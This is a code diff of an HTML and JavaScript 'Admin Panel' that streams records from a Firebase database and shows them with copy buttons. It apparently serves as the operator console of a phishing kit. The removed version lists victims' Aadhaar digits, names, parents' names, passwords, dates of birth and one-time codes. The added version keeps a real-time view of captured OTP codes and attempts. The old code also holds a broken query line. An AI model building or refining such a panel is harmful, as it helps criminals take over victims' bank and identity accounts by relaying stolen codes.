@@ -1,41 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Panel - All / Grouped Data</title>
-  <style>
-    body { font-family: Arial, sans-serif; background: #f2f2f2; margin: 0; padding: 0; }
-    header { background: #007BFF; color: white; padding: 15px; text-align: center; font-size: 24px; }
-    .buttons { text-align: center; margin: 15px 0; }
-    .buttons button { margin: 0 5px; padding: 8px 16px; cursor: pointer; border: none; border-radius: 5px; background: #007BFF; color: white; }
-    .buttons button.active { background: #0056b3; }
-    .container { padding: 20px; max-width: 1200px; margin: auto; overflow-y: auto; height: 80vh; }
-    .session-block { background: white; margin-bottom: 20px; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 2px solid #28a745; }
-    .session-title { font-weight: bold; margin-bottom: 10px; font-size: 18px; }
-    .data-item { background: #f9f9f9; margin-bottom: 10px; padding: 10px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-    .data-item small { display: block; margin-top: 5px; color: gray; font-size: 12px; }
-    .field { margin-bottom: 5px; display: flex; align-items: center; flex-wrap: nowrap; gap: 5px; }
-    .field-name { width: 100px; font-weight: bold; }
-    .field-value { flex: 1; }
-    button.copy-btn { padding: 3px 8px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
-    button.copy-btn:hover { background: #218838; }
-    .otp-field .field-value { color: #d63384; font-weight: bold; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+
+<style>
+body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; }
+header { background:#007BFF; color:#fff; padding:15px; text-align:center; font-size:22px; }
+
+.buttons { text-align:center; margin:10px; }
+.buttons button {
+  padding:8px 16px; margin:0 5px;
+  border:none; border-radius:5px;
+  background:#007BFF; color:#fff; cursor:pointer;
+}
+.buttons button.active { background:#0056b3; }
+
+.container {
+  max-width:1200px; margin:auto; padding:15px;
+  height:80vh; overflow-y:auto;
+}
+
+.session-block {
+  background:#fff; border:2px solid #28a745;
+  border-radius:8px; padding:15px; margin-bottom:20px;
+}
+
+.session-title {
+  font-weight:bold; font-size:18px; margin-bottom:10px;
+}
+
+.data-item {
+  background:#f9f9f9; padding:10px; margin-bottom:10px;
+  border-radius:5px;
+}
+
+.field {
+  display:flex; align-items:center; gap:5px; margin-bottom:5px;
+}
+.field-name { width:90px; font-weight:bold; }
+.field-value { flex:1; }
+
+.copy-btn {
+  padding:3px 8px; border:none; border-radius:5px;
+  background:#28a745; color:#fff; cursor:pointer;
+}
+
+.otp-field .field-value {
+  color:#d63384; font-weight:bold;
+}
+
+small { color:gray; font-size:12px; }
+</style>
 </head>
+
 <body>
-<header>Admin</header>
+
+<header>Admin Panel</header>
 
 <div class="buttons">
   <button id="allBtn" class="active">All Data</button>
-  <button id="groupBtn">Grouped Data</button>
+  <button id="groupBtn">Grouped</button>
 </div>
 
 <div class="container" id="dataContainer"></div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
-import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+import { getFirestore, collection, query, orderBy, onSnapshot }
+from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
@@ -43,200 +77,123 @@ const firebaseConfig = {
   projectId: "ss22-a96d3",
   storageBucket: "ss22-a96d3.firebasestorage.app",
   messagingSenderId: "607942972170",
-  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
-  measurementId: "G-KT1P0Q0FD0",
+  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
-const container = document.getElementById('dataContainer');
+const container = document.getElementById("dataContainer");
 
 let allData = [];
-let currentView = 'all';
-
-// sessionMap stores sessionId => number
+let view = "all";
 let sessionMap = {};
-let nextSessionNumber = 1;
+let nextSessionNo = 1;
 
 const fieldMap = {
-  aadhaarLastDigits: "Add",
-  fullName: "Name",
-  fatherName: "F:Name",
-  motherName: "M:Name",
-  profilePassword: "PP",
-  dateOfBirth: "DOB",
-  userId: "UserId",
-  password: "Paswrd",
-
-  otp: "OTP",
   otp1: "OTP 1",
   otp2: "OTP 2",
   otp3: "OTP 3",
-  opt4: "OTP 4"
+  otp4: "OTP 4",
+  attempt: "Attempt"
 };
 
-// Merge snapshot and assign session numbers
-function mergeAndSort(snapshot) {
-  snapshot.forEach(doc => {
-    const data = doc.data();
-    data.id = doc.id;
-    allData.push(data);
+// 🔥 READ ONLY opt1 COLLECTION
+const q = query(collection(db, "opt1"), orderBy("timestamp", "desc"));
+onSnapshot(q, snap => {
+  allData = [];
+  snap.forEach(doc => {
+    const d = doc.data();
+    d.id = doc.id;
+    allData.push(d);
 
-    const sess = data.sessionId || data.userId || "Unknown";
-
-    // assign number if new session
-    if (!sessionMap[sess]) {
-      sessionMap[sess] = nextSessionNumber++;
-    }
+    const sid = d.sessionId || "Unknown";
+    if (!sessionMap[sid]) sessionMap[sid] = nextSessionNo++;
   });
-
-  allData.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
   render();
-}
-
-const usersQuery = query(collection(db, "users33" "opt1" "opt2" "opt3" "opt4"), orderBy("timestamp", "desc"));
-onSnapshot(usersQuery, mergeAndSort);
-
-const otpQuery = query(collection(db, "otp_attempts"), orderBy("timestamp", "desc"));
-onSnapshot(otpQuery, mergeAndSort);
+});
 
 function render() {
-  if(currentView==='all') renderAllData(allData);
-  else renderGroupedData(allData);
+  if (view === "all") renderAll();
+  else renderGrouped();
 }
 
-function renderAllData(dataArray) {
-  container.innerHTML="";
-  dataArray.forEach(item=>{
-    const itemDiv=document.createElement("div");
-    itemDiv.className="data-item";
-
-    const fields={...item};
-    delete fields.sessionId; delete fields.page; delete fields.attempt;
-    delete fields.timestamp; delete fields.id; delete fields.captcha;
-
-    Object.keys(fields).forEach(key=>{
-      if(!fieldMap[key]) return;
-      const fieldDiv=document.createElement("div");
-      fieldDiv.className="field";
-      if(key==="otp") fieldDiv.classList.add("otp-field");
-
-      const nameDiv=document.createElement("div");
-      nameDiv.className="field-name";
-      nameDiv.textContent=fieldMap[key]+":";
-
-      const valueDiv=document.createElement("div");
-      valueDiv.className="field-value";
-      valueDiv.textContent=fields[key];
-
-      const copyBtn=document.createElement("button");
-      copyBtn.className="copy-btn";
-      copyBtn.textContent="Copy";
-      copyBtn.addEventListener("click", ()=>navigator.clipboard.writeText(fields[key]).then(()=>alert(`Copied: ${fields[key]}`)));
-
-      fieldDiv.appendChild(nameDiv);
-      fieldDiv.appendChild(valueDiv);
-      fieldDiv.appendChild(copyBtn);
-      itemDiv.appendChild(fieldDiv);
-    });
-
-    if(item.timestamp){
-      const timeDiv=document.createElement("small");
-      timeDiv.textContent=new Date(item.timestamp.seconds*1000).toLocaleString();
-      itemDiv.appendChild(timeDiv);
-    }
-
-    container.appendChild(itemDiv);
+function renderAll() {
+  container.innerHTML = "";
+  allData.forEach(item => {
+    container.appendChild(buildItem(item));
   });
 }
 
-function renderGroupedData(dataArray) {
+function renderGrouped() {
+  container.innerHTML = "";
   const grouped = {};
-  dataArray.forEach(item=>{
-    const sess=item.sessionId || item.userId || "Unknown";
-    if(!grouped[sess]) grouped[sess]=[];
-    grouped[sess].push(item);
+
+  allData.forEach(i => {
+    const sid = i.sessionId || "Unknown";
+    if (!grouped[sid]) grouped[sid] = [];
+    grouped[sid].push(i);
   });
 
-  container.innerHTML="";
-
-  // Sort sessions by newest timestamp first (so new sessions at top)
-  const sessionsSorted = Object.keys(grouped).sort((a,b)=>{
-    const latestA = grouped[a][0].timestamp?.seconds || 0;
-    const latestB = grouped[b][0].timestamp?.seconds || 0;
-    return latestB - latestA;
-  });
-
-  sessionsSorted.forEach(sess=>{
-    const sessionDiv = document.createElement("div");
-    sessionDiv.className = "session-block";
+  Object.keys(grouped).forEach(sid => {
+    const box = document.createElement("div");
+    box.className = "session-block";
 
     const title = document.createElement("div");
     title.className = "session-title";
-    title.textContent = `Session ${sessionMap[sess]} - ${sess}`; // number stays fixed
-    sessionDiv.appendChild(title);
+    title.textContent = `Session ${sessionMap[sid]} - ${sid}`;
+    box.appendChild(title);
 
-    grouped[sess].sort((a,b)=> (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
-
-    grouped[sess].forEach(item=>{
-      const itemDiv=document.createElement("div");
-      itemDiv.className="data-item";
-
-      const fields={...item};
-      delete fields.sessionId; delete fields.page; delete fields.attempt;
-      delete fields.timestamp; delete fields.id; delete fields.captcha;
-
-      Object.keys(fields).forEach(key=>{
-        if(!fieldMap[key]) return;
-        const fieldDiv=document.createElement("div");
-        fieldDiv.className="field";
-        if(key==="otp1") fieldDiv.classList.add("otp-field");
-
-        const nameDiv=document.createElement("div");
-        nameDiv.className="field-name";
-        nameDiv.textContent=fieldMap[key]+":";
-
-        const valueDiv=document.createElement("div");
-        valueDiv.className="field-value";
-        valueDiv.textContent=fields[key];
-
-        const copyBtn=document.createElement("button");
-        copyBtn.className="copy-btn";
-        copyBtn.textContent="Copy";
-        copyBtn.addEventListener("click", ()=>navigator.clipboard.writeText(fields[key]).then(()=>alert(`Copied: ${fields[key]}`)));
-
-        fieldDiv.appendChild(nameDiv);
-        fieldDiv.appendChild(valueDiv);
-        fieldDiv.appendChild(copyBtn);
-        itemDiv.appendChild(fieldDiv);
-      });
-
-      if(item.timestamp){
-        const timeDiv=document.createElement("small");
-        timeDiv.textContent=new Date(item.timestamp.seconds*1000).toLocaleString();
-        itemDiv.appendChild(timeDiv);
-      }
-
-      sessionDiv.appendChild(itemDiv);
-    });
-
-    container.appendChild(sessionDiv);
+    grouped[sid].forEach(i => box.appendChild(buildItem(i)));
+    container.appendChild(box);
   });
 }
 
-document.getElementById("allBtn").addEventListener("click", ()=>{
-  currentView='all';
-  document.getElementById("allBtn").classList.add("active");
-  document.getElementById("groupBtn").classList.remove("active");
-  render();
-});
+function buildItem(item) {
+  const div = document.createElement("div");
+  div.className = "data-item";
 
-document.getElementById("groupBtn").addEventListener("click", ()=>{
-  currentView='group';
-  document.getElementById("groupBtn").classList.add("active");
-  document.getElementById("allBtn").classList.remove("active");
+  Object.keys(fieldMap).forEach(key => {
+    if (!item[key]) return;
+
+    const row = document.createElement("div");
+    row.className = "field";
+    if (key.startsWith("otp")) row.classList.add("otp-field");
+
+    row.innerHTML = `
+      <div class="field-name">${fieldMap[key]}:</div>
+      <div class="field-value">${item[key]}</div>
+      <button class="copy-btn">Copy</button>
+    `;
+
+    row.querySelector("button").onclick = () =>
+      navigator.clipboard.writeText(item[key]);
+
+    div.appendChild(row);
+  });
+
+  if (item.timestamp) {
+    const t = document.createElement("small");
+    t.textContent = new Date(item.timestamp.seconds * 1000).toLocaleString();
+    div.appendChild(t);
+  }
+
+  return div;
+}
+
+document.getElementById("allBtn").onclick = () => {
+  view = "all";
+  allBtn.classList.add("active");
+  groupBtn.classList.remove("active");
   render();
-});
+};
+
+document.getElementById("groupBtn").onclick = () => {
+  view = "group";
+  groupBtn.classList.add("active");
+  allBtn.classList.remove("active");
+  render();
+};
 </script>
+
 </body>
 </html>
